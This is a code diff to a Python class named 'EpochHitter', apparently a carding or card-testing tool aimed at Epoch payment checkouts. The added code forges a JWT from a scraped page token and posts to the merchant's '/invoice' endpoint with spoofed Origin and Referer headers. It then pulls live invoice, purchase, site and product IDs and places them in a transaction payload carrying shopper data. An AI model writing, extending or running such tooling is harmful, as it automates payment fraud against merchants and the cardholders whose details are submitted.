@@ -180,6 +180,49 @@ class EpochHitter:
             if amt_m:
                 cfg['amount'] = amt_m.group(1)
 
+        # 4. If WNU / Epoch SPA token found, fetch live invoice metadata
+        if cfg.get('token') and cfg.get('cacheKey'):
+            try:
+                inv_payload = {
+                    "cacheKey": cfg['cacheKey'],
+                    "countryCode": "US",
+                    "isApplePayEnabled": False,
+                    "language": "en",
+                    "sessionId": cfg.get('sessionID', '')
+                }
+                jwt_tok = _jwt_sign(inv_payload, cfg['token'])
+                inv_hdr = {
+                    "Authorization": f"Bearer {jwt_tok}",
+                    "Content-Type": "application/json",
+                    "Accept": "application/json, text/plain, */*",
+                    "User-Agent": UA,
+                    "Origin": self._get_origin(),
+                    "Referer": self.url,
+                }
+                inv_url = urljoin(self.url, "/invoice")
+                async with session.post(inv_url, json=inv_payload, headers=inv_hdr, timeout=8) as r_inv:
+                    if r_inv.status_code == 200:
+                        inv_json = r_inv.json()
+                        cfg['invoiceID'] = inv_json.get('invoiceID')
+                        purchases = inv_json.get('invoiceInfo', {}).get('purchases', [])
+                        if purchases:
+                            p0 = purchases[0]
+                            cfg['purchaseID'] = str(p0.get('purchase_id') or inv_json.get('invoiceInfo', {}).get('client_id') or "1")
+                            cfg['purchaseItemID'] = str(p0.get('purchase_item_id') or "1")
+                            cfg['siteID'] = str(p0.get('site_id') or "1")
+                            cfg['productCode'] = str(p0.get('product_id') or "1")
+                            site_name = p0.get('site') or inv_json.get('merchantInfo', {}).get('name')
+                            if site_name:
+                                cfg['merchant'] = site_name.replace('www.', '').capitalize()
+                            billing = p0.get('billing', {})
+                            curr = billing.get('currency', 'USD')
+                            cfg['currency'] = curr
+                            amt = billing.get('initial', {}).get('dollarAmount') or billing.get('initial', {}).get('amount')
+                            if amt:
+                                cfg['amount'] = amt
+            except Exception:
+                pass
+
         return cfg
 
     async def _get_config(self, session) -> dict:
@@ -292,7 +335,8 @@ class EpochHitter:
                 cfg = await self._get_config(sess)
                 result['merchant'] = cfg.get('merchant', 'Epoch Merchant')
                 if cfg.get('amount'):
-                    result['amount'] = f"USD {cfg['amount']}"
+                    curr = cfg.get('currency', 'USD')
+                    result['amount'] = f"{curr} {cfg['amount']}"
 
                 if not cfg.get('is_epoch') and 'epoch' not in self.url.lower():
                     result['error'] = "No Epoch checkout gateway detected on this page"
@@ -312,11 +356,11 @@ class EpochHitter:
                     tx_payload = {
                         "cacheKey": c_key,
                         "sessionID": s_id,
-                        "invoiceID": c_key,
-                        "purchaseID": "1",
-                        "purchaseItemID": "1",
-                        "siteID": "1",
-                        "productCode": "1",
+                        "invoiceID": cfg.get('invoiceID', c_key),
+                        "purchaseID": cfg.get('purchaseID', '1'),
+                        "purchaseItemID": cfg.get('purchaseItemID', '1'),
+                        "siteID": cfg.get('siteID', '1'),
+                        "productCode": cfg.get('productCode', '1'),
                         "currencyCode": cfg.get('currency', 'USD'),
                         "countryCode": shopper.get('country', 'US'),
                         "submitCount": 1,
